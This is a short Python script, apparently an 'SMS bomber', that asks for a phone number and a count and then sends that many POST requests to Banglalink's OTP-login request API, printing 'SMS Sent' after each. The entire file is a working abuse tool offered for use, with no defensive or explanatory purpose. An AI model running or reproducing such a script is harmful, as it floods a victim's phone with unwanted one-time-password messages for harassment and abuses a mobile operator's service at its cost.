import requests

# POST 

myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
number=str(input(" Enter Your Number : "))

amount=int(input(" Enter The Amount : "))

for i in range(amount):
    requests.post(myblapi,
    data=number)
    
    print(str(i+1)+"SMS Sent")